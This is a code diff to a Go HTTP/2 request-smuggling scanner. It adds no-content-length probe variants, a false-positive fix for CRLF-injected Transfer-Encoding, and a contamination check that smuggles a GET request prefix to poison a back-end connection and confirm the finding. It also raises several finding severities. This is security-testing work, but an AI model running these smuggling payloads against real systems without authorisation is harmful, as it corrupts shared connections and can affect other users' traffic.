@@ -25,6 +25,7 @@ import (
 	"fmt"
 	"net"
 	"net/url"
+	"strings"
 	"time"
 
 	"golang.org/x/net/http2"
@@ -100,11 +101,12 @@ func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *repor
 	// they use the legacy h2RequestWithInjectedHeader path instead.
 	// For these, lHdr/lVal hold the header name and the CRLF-embedded value.
 	type h2TEProbe struct {
-		name   string
-		extra  map[string]string // extraHeaders for h2RawRequest path
-		legacy bool              // true → use h2RequestWithInjectedHeader
-		lHdr   string            // legacy: header name
-		lVal   string            // legacy: header value (may contain \r\n)
+		name       string
+		extra      map[string]string // extraHeaders for h2RawRequest path
+		legacy     bool              // true → use h2RequestWithInjectedHeader
+		lHdr       string            // legacy: header name
+		lVal       string            // legacy: header value (may contain \r\n)
+		suppressCL bool             // omit content-length header entirely
 	}
 
 	// Build the comprehensive technique list.
@@ -251,22 +253,51 @@ func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *repor
 
 	timeoutThreshold := time.Duration(float64(cfg.Timeout) * request.TimeoutRatio)
 
+	// Append no-CL variants for every technique.
+	// In HTTP/2 the DATA frame already delimits the body (RFC 9113 §8.1.2.6),
+	// so content-length is redundant. Sending CL + TE:chunked together can cause
+	// HTTP/2-strict servers (e.g. Cloudflare) to reject the request at the H2 layer
+	// before any downgrade happens — suppressing CL lets the TE reach the back-end.
+	withCL := teProbes
+	noCL := make([]h2TEProbe, len(withCL))
+	for i, p := range withCL {
+		p.name += "-noCL"
+		p.suppressCL = true
+		noCL[i] = p
+	}
+	teProbes = append(teProbes, noCL...)
+
 	dbg(cfg, "H2.TE synced body: %q (%d bytes)", h2TESyncedBody, len(h2TESyncedBody))
 	dbg(cfg, "H2.TE attack body: %q (%d bytes), declared chunk=%d actual=%d",
 		h2TEAttackBody, len(h2TEAttackBody), attackChunkSize, len(h2TEChunkData))
 	dbg(cfg, "H2.TE timeout threshold: %v (ratio=%.2f of %v)", timeoutThreshold, request.TimeoutRatio, cfg.Timeout)
-	dbg(cfg, "H2.TE total techniques: %d", len(teProbes))
+	dbg(cfg, "H2.TE total techniques: %d (%d with-CL + %d no-CL)", len(teProbes), len(withCL), len(noCL))
 
 	// h2TESend dispatches to the correct sender.
 	//   extra path  → h2RawRequest with probe.extra as extraHeaders
 	//   legacy path → h2RequestWithInjectedHeader (CRLF embedded in value)
 	h2TESend := func(probe h2TEProbe, body string) ([]byte, int, time.Duration, error) {
 		if probe.legacy {
+			clOverride := ""
+			if probe.suppressCL {
+				clOverride = "suppress"
+			}
 			return h2RequestWithInjectedHeader(target, path, host,
-				probe.lHdr, probe.lVal, cfg, body, "")
+				probe.lHdr, probe.lVal, cfg, body, clOverride)
+		}
+		extra := probe.extra
+		if probe.suppressCL {
+			// Build a copy of extra with content-length suppressed.
+			// Passing "" as the value triggers the suppressCL path in h2RawRequest.
+			merged := make(map[string]string, len(probe.extra)+1)
+			for k, v := range probe.extra {
+				merged[k] = v
+			}
+			merged["content-length"] = "" // "" → suppressCL=true in h2RawRequest
+			extra = merged
 		}
 		start := time.Now()
-		resp, err := h2RawRequest(target, "POST", path, host, body, probe.extra, cfg)
+		resp, err := h2RawRequest(target, "POST", path, host, body, extra, cfg)
 		elapsed := time.Since(start)
 		if err != nil {
 			return nil, 0, elapsed, err
@@ -337,16 +368,35 @@ func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *repor
 				continue
 			}
 
-			// FP validation: broken TE name
+			// FP validation: broken TE name.
+			//
+			// For techniques that inject Transfer-Encoding as a direct header key
+			// (e.g. vanilla, suffix1), we remove "transfer-encoding" and add
+			// "zransfer-encoding" instead.
+			//
+			// For techniques that inject TE via CRLF embedded in a pseudo-header
+			// VALUE (h2auth, h2method, h2path), the extra map key is ":authority",
+			// ":method" or ":path" — delete("transfer-encoding") is a no-op and
+			// the real injection survives, so the broken-TE also times out and
+			// incorrectly triggers the "probably FP" label.
+			//
+			// Fix: also replace "Transfer-Encoding:" → "zransfer-encoding:" inside
+			// all header VALUES so CRLF-injected TE is broken regardless of which
+			// field carries it.
 			fpLabel := ""
 			brokenTech := tech
 			if tech.legacy {
 				brokenTech.lHdr = "zransfer-encoding"
 			} else {
-				brokenExtra := make(map[string]string, len(tech.extra))
+				brokenExtra := make(map[string]string, len(tech.extra)+1)
 				for k, v := range tech.extra {
+					// Break any CRLF-injected Transfer-Encoding hidden in a header value
+					// (covers h2auth / h2method / h2path pseudo-header injection).
+					v = strings.ReplaceAll(v, "Transfer-Encoding:", "zransfer-encoding:")
+					v = strings.ReplaceAll(v, "transfer-encoding:", "zransfer-encoding:")
 					brokenExtra[k] = v
 				}
+				// Also handle the case where TE is a plain header key.
 				delete(brokenExtra, "transfer-encoding")
 				brokenExtra["zransfer-encoding"] = "chunked"
 				brokenTech.extra = brokenExtra
@@ -357,23 +407,87 @@ func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *repor
 				rep.Log("H2Downgrade %s: broken-TE also timed out — probable FP", tech.name)
 			}
 
-			sev := report.SeverityProbable
+			// Contamination check: only when broken-TE is clean (genuine TE-specific signal).
+			//
+			// We send a properly-terminated chunked body that appends a smuggled HTTP/1.1
+			// request prefix after the final chunk (0\r\n\r\n). The H1 back-end processes
+			// the chunked body cleanly, then treats the suffix as the start of a new request.
+			// A follow-up GET we send immediately after lands on the same back-end H1
+			// connection and receives the response to our smuggled GET instead of its own.
+			//
+			// Detection: follow-up status diverges from clean GET baseline, or the canary
+			// path appears in the follow-up body (error page reflecting the smuggled path).
+			contaminationConfirmed := false
+			contaminationEvidence := ""
+			if fpLabel == "" {
+				canaryPath := config.EffectiveCanaryPath(cfg)
+				smuggledPrefix := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nFoo: ", canaryPath, host)
+				// Body: correct chunk (terminates cleanly) + final chunk + smuggled request prefix.
+				contaminationBody := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n%s",
+					syncedChunkSize, h2TEChunkData, smuggledPrefix)
+
+				// Establish a clean GET baseline for comparison.
+				contBase, contBaseErr := h2RawRequest(target, "GET", path, host, "", nil, cfg)
+				if contBaseErr == nil && contBase != nil && contBase.Status != 0 {
+					dbg(cfg, "H2.TE [%s] contamination baseline status=%d", tech.name, contBase.Status)
+					for attempt := 0; attempt < cfg.Attempts && !contaminationConfirmed; attempt++ {
+						// Poison: send the attack with the smuggled suffix.
+						_, _, _, _ = h2TESend(tech, contaminationBody)
+
+						// Follow-up: should receive the smuggled response if poisoned.
+						followup, followupErr := h2RawRequest(target, "GET", path, host, "", nil, cfg)
+						if followupErr != nil || followup == nil {
+							dbg(cfg, "H2.TE [%s] contamination attempt=%d followup error: %v",
+								tech.name, attempt, followupErr)
+							continue
+						}
+						dbg(cfg, "H2.TE [%s] contamination attempt=%d followup_status=%d base=%d canary_in_body=%v",
+							tech.name, attempt, followup.Status, contBase.Status,
+							request.ContainsStr(followup.Body, canaryPath))
+
+						if h2CLPoisonDetected(contBase, followup, canaryPath) {
+							contaminationConfirmed = true
+							contaminationEvidence = fmt.Sprintf(
+								"attempt=%d canary=%s followup_status=%d base_status=%d canary_reflected=%v",
+								attempt, canaryPath, followup.Status, contBase.Status,
+								request.ContainsStr(followup.Body, canaryPath))
+							rep.Log("H2Downgrade %s: contamination confirmed (attempt %d)", tech.name, attempt)
+						}
+					}
+				}
+			}
+
+			// v10a confirmed: synced OK on retry + attack reproduced + broken-TE clean.
+			// Classified as CRITICAL when the broken-TE check passes (fpLabel == ""),
+			// because the timeout is genuinely TE-specific (3 independent verifications).
+			// Demoted to MEDIUM when broken-TE also times out — likely infrastructure noise.
+			// When contamination is additionally confirmed, the description is upgraded.
+			sev := report.SeverityConfirmed
 			if fpLabel != "" {
 				sev = report.SeverityInfo
 			}
+			desc := fmt.Sprintf("H2.TE desync v10a: H2 request with inflated chunk size "+
+				"(declared %d, actual %d) caused timeout while synced request succeeded. "+
+				"The back-end is processing Transfer-Encoding from the downgraded H1 request.",
+				attackChunkSize, len(h2TEChunkData))
+			if contaminationConfirmed {
+				desc += " Contamination confirmed: follow-up request received the smuggled " +
+					"response, proving the back-end connection was poisoned."
+			}
+			evidence := fmt.Sprintf("elapsed=%v attack_chunk=%d synced_ok=true technique=%s",
+				elapsed, attackChunkSize, tech.name)
+			if contaminationConfirmed {
+				evidence += " contamination=" + contaminationEvidence
+			}
 			rep.Emit(report.Finding{
-				Target:    target.String(),
-				Method:    "HTTP/2",
-				Severity:  sev,
-				Type:      "H2.TE",
-				Technique: tech.name + fpLabel,
-				Description: fmt.Sprintf("H2.TE desync v10a: H2 request with inflated chunk size "+
-					"(declared %d, actual %d) caused timeout while synced request succeeded. "+
-					"The back-end is processing Transfer-Encoding from the downgraded H1 request.",
-					attackChunkSize, len(h2TEChunkData)),
-				Evidence: fmt.Sprintf("elapsed=%v attack_chunk=%d synced_ok=true technique=%s",
-					elapsed, attackChunkSize, tech.name),
-				RawProbe: probeStr,
+				Target:      target.String(),
+				Method:      "HTTP/2",
+				Severity:    sev,
+				Type:        "H2.TE",
+				Technique:   tech.name + fpLabel,
+				Description: desc,
+				Evidence:    evidence,
+				RawProbe:    probeStr,
 			})
 			if cfg.ExitOnFind {
 				return
@@ -402,7 +516,7 @@ func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *repor
 			rep.Emit(report.Finding{
 				Target:    target.String(),
 				Method:    "HTTP/2",
-				Severity:  report.SeverityProbable,
+				Severity:  report.SeverityConfirmed,
 				Type:      "H2.TE",
 				Technique: tech.name,
 				Description: fmt.Sprintf("H2.TE desync v10b: H2 request with inflated chunk size "+
@@ -419,15 +533,22 @@ func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *repor
 		}
 
 		// Secondary check: back-end error strings in body.
-		if h2BodySuspicious(resp) {
+		// Gate: only fire when attackStatus differs from syncedStatus.
+		// If both requests return the same error code (e.g. both 400), the server
+		// is rejecting the TE:chunked header at the H2 layer regardless of chunk
+		// size — the suspicious body text is not TE-specific and firing here would
+		// be a false positive (e.g. Cloudflare returning "400 Bad Request" for any
+		// H2 request that carries Transfer-Encoding).
+		if h2BodySuspicious(resp) && attackStatus != syncedStatus {
 			rep.Emit(report.Finding{
 				Target:      target.String(),
 				Method:      "HTTP/2",
-				Severity:    report.SeverityProbable,
+				Severity:    report.SeverityConfirmed,
 				Type:        "H2.TE",
 				Technique:   tech.name,
 				Description: "H2→H1 downgrade with injected TE caused back-end rejection — possible desync",
-				Evidence:    fmt.Sprintf("elapsed=%v h2_body_suspicious=true", elapsed),
+				Evidence: fmt.Sprintf("elapsed=%v synced_status=%d attack_status=%d h2_body_suspicious=true",
+					elapsed, syncedStatus, attackStatus),
 				RawProbe:    probeStr,
 				RawResponse: request.Truncate(string(resp), 256),
 			})
@@ -492,28 +613,35 @@ func h2RequestWithInjectedHeader(target *url.URL, path, host, headerName, header
 	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
 	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
 	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
-	// Default body/CL when not overridden
+	// Default body/CL when not overridden.
+	// "suppress" sentinel: omit content-length entirely (RFC 9113 §8.1.2.6 —
+	// in HTTP/2 the DATA frame already delimits the body, CL is redundant).
 	if body == "" {
 		body = "x=y"
 	}
+	suppressLegacyCL := clOverride == "suppress"
 	cl := clOverride
-	if cl == "" {
+	if !suppressLegacyCL && cl == "" {
 		cl = fmt.Sprintf("%d", len(body))
 	}
 
 	enc.WriteField(hpack.HeaderField{Name: "content-type", Value: "application/x-www-form-urlencoded"})
-	// Skip default CL when the injected header overrides it — emitting two
-	// content-length fields violates RFC 7540 §8.1.2.6 and most H2 servers
-	// reject the request with PROTOCOL_ERROR before forwarding to back-end.
-	if headerName != "content-length" {
+	// Omit CL when suppressed (no-CL variant) or when the injected header IS
+	// content-length — emitting two content-length fields violates RFC 7540
+	// §8.1.2.6 and most H2 servers reject with PROTOCOL_ERROR.
+	if !suppressLegacyCL && headerName != "content-length" {
 		enc.WriteField(hpack.HeaderField{Name: "content-length", Value: cl})
 	}
 	enc.WriteField(hpack.HeaderField{Name: "accept-encoding", Value: "identity"})
 	// Inject the malformed/override header
 	enc.WriteField(hpack.HeaderField{Name: headerName, Value: headerValue, Sensitive: false})
 
+	clLog := cl
+	if suppressLegacyCL {
+		clLog = "(suppressed)"
+	}
 	dbg(cfg, "  h2Inject: sending HEADERS+DATA — %s: %q, body=%q (%d bytes), CL=%s",
-		headerName, headerValue, body, len(body), cl)
+		headerName, headerValue, body, len(body), clLog)
 
 	start := time.Now()
 
